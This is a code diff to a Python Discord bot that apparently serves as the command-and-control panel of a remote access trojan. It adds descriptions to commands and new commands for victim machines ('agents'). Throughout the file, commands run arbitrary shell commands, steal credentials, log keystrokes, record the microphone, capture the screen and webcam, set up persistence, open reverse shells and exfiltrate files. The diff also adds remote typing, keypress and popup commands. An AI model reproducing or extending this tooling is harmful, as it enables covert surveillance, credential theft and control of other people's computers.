@@ -196,7 +196,7 @@ class InteractButton(discord.ui.View):
 bot = BOT()
 
 
-@bot.hybrid_command(name = "interact", with_app_command = True)
+@bot.hybrid_command(name = "interact", with_app_command = True, description = "Interact with an agent")
 @app_commands.guilds(GUILD)
 async def cmd(ctx:commands.Context, id:int):
     global CURRENT_AGENT
@@ -208,7 +208,7 @@ async def cmd(ctx:commands.Context, id:int):
     await ctx.reply(embed = my_embed)
 
 
-@bot.hybrid_command(name = "background", with_app_command = True)
+@bot.hybrid_command(name = "background", with_app_command = True, description = "Background an agent")
 @app_commands.guilds(GUILD)
 async def cmd(ctx:commands.Context):
     global CURRENT_AGENT
@@ -220,7 +220,7 @@ async def cmd(ctx:commands.Context):
     await ctx.reply(embed = my_embed)
 
 
-@bot.hybrid_command(name = "cmd", with_app_command = True)
+@bot.hybrid_command(name = "cmd", with_app_command = True, description = "Run any command on the target machine")
 @app_commands.guilds(GUILD)
 async def cmd(ctx:commands.Context, command:str):
     if (int(CURRENT_AGENT) == int(ID)):
@@ -235,7 +235,7 @@ async def cmd(ctx:commands.Context, command:str):
             await ctx.reply(f"```{result}```")
 
 
-@bot.hybrid_command(name = "cmd-all", with_app_command = True)
+@bot.hybrid_command(name = "cmd-all", with_app_command = True, description = "Run any command on the all online agents")
 @app_commands.guilds(GUILD)
 async def cmd(ctx:commands.Context, command:str):
     result = maciassdopia.cmd(command)
@@ -249,7 +249,7 @@ async def cmd(ctx:commands.Context, command:str):
         await ctx.reply(f"```{result}```")
 
 
-@bot.hybrid_command(name = "webshot", with_app_command = True)
+@bot.hybrid_command(name = "webshot", with_app_command = True, description = "Capture a picture from the target machine's screen")
 @app_commands.guilds(GUILD)
 async def webshot(ctx:commands.Context):
     if (int(CURRENT_AGENT) == int(ID)):
@@ -272,7 +272,7 @@ async def webshot(ctx:commands.Context):
                 await ctx.reply(embed = my_embed)
 
 
-@bot.hybrid_command(name = "cd", with_app_command = True)
+@bot.hybrid_command(name = "cd", with_app_command = True, description = "Change the current directory on the target machine")
 @app_commands.guilds(GUILD)
 async def cd(ctx:commands.Context, path:str):
     if (int(CURRENT_AGENT) == int(ID)):
@@ -291,7 +291,7 @@ async def cd(ctx:commands.Context, path:str):
 
 
 
-@bot.hybrid_command(name = "process", with_app_command = True)
+@bot.hybrid_command(name = "process", with_app_command = True, description = "List all the processes running on the target machine")
 @app_commands.guilds(GUILD)
 async def upload(ctx:commands.Context):
     if (int(CURRENT_AGENT) == int(ID)):
@@ -306,7 +306,7 @@ async def upload(ctx:commands.Context):
             await ctx.reply(f"```{result}```")
 
 
-@bot.hybrid_command(name = "upload", with_app_command = True)
+@bot.hybrid_command(name = "upload", with_app_command = True, description = "Upload a file to the agent")
 @app_commands.guilds(GUILD)
 async def upload(ctx:commands.Context, url:str, name:str):
     if (int(CURRENT_AGENT) == int(ID)):
@@ -324,7 +324,7 @@ async def upload(ctx:commands.Context, url:str, name:str):
         await ctx.reply(embed = my_embed)
 
 
-@bot.hybrid_command(name = "screenshot", with_app_command = True)
+@bot.hybrid_command(name = "screenshot", with_app_command = True, description = "Take a screenshot of the target machine's screen")
 @app_commands.guilds(GUILD)
 async def screenshot(ctx:commands.Context):
     if (int(CURRENT_AGENT) == int(ID)):
@@ -340,7 +340,7 @@ async def screenshot(ctx:commands.Context):
             await ctx.reply(embed = my_embed)
 
 
-@bot.hybrid_command(name = "creds", with_app_command = True)
+@bot.hybrid_command(name = "creds", with_app_command = True, description = "Get the credentials of the target machine")
 @app_commands.guilds(GUILD)
 async def creds(ctx:commands.Context):
     if (int(CURRENT_AGENT) == int(ID)):
@@ -356,7 +356,7 @@ async def creds(ctx:commands.Context):
             await ctx.reply(embed = my_embed)
 
 
-@bot.hybrid_command(name = "persistent", with_app_command = True)
+@bot.hybrid_command(name = "persistent", with_app_command = True, description = "Make the agent persistent on the target machine")
 @app_commands.guilds(GUILD)
 async def persistent(ctx:commands.Context):
     if (int(CURRENT_AGENT) == int(ID)):
@@ -374,7 +374,7 @@ async def persistent(ctx:commands.Context):
         await ctx.reply(embed = my_embed)
 
 
-@bot.hybrid_command(name = "ls", with_app_command = True)
+@bot.hybrid_command(name = "ls", with_app_command = True, description = "List all the current online agents")
 @app_commands.guilds(GUILD)
 async def ls(ctx: commands.Context):
     if ctx.interaction:
@@ -402,7 +402,7 @@ async def ls(ctx: commands.Context):
         await ctx.reply(embed = my_embed, view = view)
 
 
-@bot.hybrid_command(name = "download", with_app_command = True)
+@bot.hybrid_command(name = "download", with_app_command = True, description = "Download file from the target machine")
 @app_commands.guilds(GUILD)
 async def download(ctx:commands.Context, path:str):
     if (int(CURRENT_AGENT) == int(ID)):
@@ -416,7 +416,7 @@ async def download(ctx:commands.Context, path:str):
             await ctx.reply(embed = my_embed)
 
 
-@bot.hybrid_command(name = "terminate", with_app_command = True)
+@bot.hybrid_command(name = "terminate", with_app_command = True, description = "Terminate the agent")
 @app_commands.guilds(GUILD)
 async def download(ctx:commands.Context):
     if (int(CURRENT_AGENT) == int(ID)):
@@ -429,7 +429,7 @@ async def download(ctx:commands.Context):
         sys.exit()
 
 
-@bot.hybrid_command(name = "selfdestruct", with_app_command = True)
+@bot.hybrid_command(name = "selfdestruct", with_app_command = True, description = "Delete the agent from the target machine")
 @app_commands.guilds(GUILD)
 async def selfdestruct(ctx:commands.Context):
     if (int(CURRENT_AGENT) == int(ID)):
@@ -447,7 +447,7 @@ async def selfdestruct(ctx:commands.Context):
         await ctx.reply(embed = my_embed)
 
 
-@bot.hybrid_command(name = "location", with_app_command = True)
+@bot.hybrid_command(name = "location", with_app_command = True, description = "Get the location of the target machine")
 @app_commands.guilds(GUILD)
 async def location(ctx:commands.Context):
     if (int(CURRENT_AGENT) == int(ID)):
@@ -471,7 +471,7 @@ async def location(ctx:commands.Context):
         await ctx.reply(embed = my_embed)
 
 
-@bot.hybrid_command(name = "revshell", with_app_command = True)
+@bot.hybrid_command(name = "revshell", with_app_command = True, description = "Get a reverse shell on the target machine")
 @app_commands.guilds(GUILD)
 async def location(ctx:commands.Context, ip:str, port:str):
     if (int(CURRENT_AGENT) == int(ID)):
@@ -484,7 +484,7 @@ async def location(ctx:commands.Context, ip:str, port:str):
         await ctx.reply(embed = my_embed)
 
 
-@bot.hybrid_command(name = "recordmic", with_app_command = True)
+@bot.hybrid_command(name = "recordmic", with_app_command = True, description = "Record the microphone of the target machine")
 @app_commands.guilds(GUILD)
 async def recordmic(ctx:commands.Context, seconds:int):
     if (int(CURRENT_AGENT) == int(ID)):
@@ -507,7 +507,7 @@ async def recordmic(ctx:commands.Context, seconds:int):
                 await ctx.reply(embed = my_embed)
 
 
-@bot.hybrid_command(name = "wallpaper", with_app_command = True)
+@bot.hybrid_command(name = "wallpaper", with_app_command = True, description = "Change the wallpaper of the target machine")
 @app_commands.guilds(GUILD)
 async def wallpaper(ctx:commands.Context, path_url:str):
     if (int(CURRENT_AGENT) == int(ID)):
@@ -525,7 +525,7 @@ async def wallpaper(ctx:commands.Context, path_url:str):
         await ctx.reply(embed = my_embed)
 
 
-@bot.hybrid_command(name = "killproc", with_app_command = True)
+@bot.hybrid_command(name = "killproc", with_app_command = True, description = "Kill a process on the target machine")
 @app_commands.guilds(GUILD)
 async def killproc(ctx:commands.Context, pid:int):
     if (int(CURRENT_AGENT) == int(ID)):
@@ -543,7 +543,7 @@ async def killproc(ctx:commands.Context, pid:int):
         await ctx.reply(embed = my_embed)
 
 
-@bot.hybrid_command(name = "keylog", with_app_command = True)
+@bot.hybrid_command(name = "keylog", with_app_command = True, description = "Start a keylogger on the target machine")
 @app_commands.guilds(GUILD)
 async def keylog(ctx:commands.Context, mode:str, interval:int):
     if (int(CURRENT_AGENT) == int(ID)):
@@ -566,9 +566,63 @@ async def keylog(ctx:commands.Context, mode:str, interval:int):
                 color = 0x00FF00
             )
         await ctx.reply(embed = my_embed)
+        
+        
+@bot.hybrid_command(name = "write", with_app_command = True, description = "Type specified characters on Agent")
+@app_commands.guilds(GUILD)
+async def write(ctx:commands.Context, string:str, interval:float = 0.25):
+    if (int(CURRENT_AGENT) == int(ID)):
+        result = maciassdopia.write(string, interval)
+        if result:
+            my_embed = discord.Embed(
+                title=f"Typed ```{string}``` on Agent#{ID}",
+                color=0x00FF00
+            )
+        else:
+            my_embed = discord.Embed(
+                title=f"Error while typing ```{string}``` on Agent#{ID}",
+                color=0xFF0000
+            )
+        await ctx.reply(embed = my_embed)
+        
+        
+@bot.hybrid_command(name = "press", with_app_command = True, description = "Press the selected key on Agent")
+@app_commands.guilds(GUILD)
+async def press(ctx:commands.Context, letter:str):
+    if (int(CURRENT_AGENT) == int(ID)):
+        result = maciassdopia.press(letter)
+        if result:
+            my_embed = discord.Embed(
+                title=f"Pressed ```{letter}``` on Agent#{ID}",
+                color=0x00FF00
+            )
+        else:
+            my_embed = discord.Embed(
+                title=f"Error while pressing ```{letter}``` on Agent#{ID}",
+                color=0xFF0000
+            )
+        await ctx.reply(embed = my_embed)
+        
+
+@bot.hybrid_command(name = "message", with_app_command = True, description = "Show message box in the center of Agent screen")
+@app_commands.guilds(GUILD)
+async def type(ctx:commands.Context, message:str):
+    if (int(CURRENT_AGENT) == int(ID)):
+        result = maciassdopia.message(message)
+        if result:
+            my_embed = discord.Embed(
+                title=f"Message ```{message}``` was showed Agent#{ID}",
+                color=0x00FF00
+            )
+        else:
+            my_embed = discord.Embed(
+                title=f"Error while showing message on Agent#{ID}",
+                color=0xFF0000
+            )
+        await ctx.reply(embed = my_embed)
 
 
-@bot.hybrid_command(name = "help", with_app_command = True)
+@bot.hybrid_command(name = "help", with_app_command = True, description = "Help menu")
 @app_commands.guilds(GUILD)
 async def keylog(ctx:commands.Context):
     my_embed = discord.Embed(title=f"Help Menu", color=0x00FF00)
@@ -590,6 +644,9 @@ async def keylog(ctx:commands.Context):
     my_embed.add_field(name="/location ", value="Get the location of the target machine", inline=False)
     my_embed.add_field(name="/revshell <ip> <port>", value="Get a reverse shell on the target machine", inline=False)
     my_embed.add_field(name="/recordmic <interval>", value="Record the microphone of the target machine", inline=False)
+    my_embed.add_field(name="/write <text>", value="Write specified text on the target computer (As it's keyboard)", inline=False)
+    my_embed.add_field(name="/press <key>", value="Press specified key (`enter` or just letters like `a`) on the target computer (As it's keyboard)", inline=False)
+    my_embed.add_field(name="/message <text>", value="Show a popup message in the center of the Agent screen with specified text", inline=False)
     my_embed.add_field(name="/wallpaper <path/url>", value="Change the wallpaper of the target machine", inline=False)
     my_embed.add_field(name="/killproc <pid>", value="Kill a process on the target machine", inline=False)
     my_embed.add_field(name="/keylog <mode> <interval>", value="Start/Stop a keylogger on the target machine\n/`keylog start 60`", inline=False)
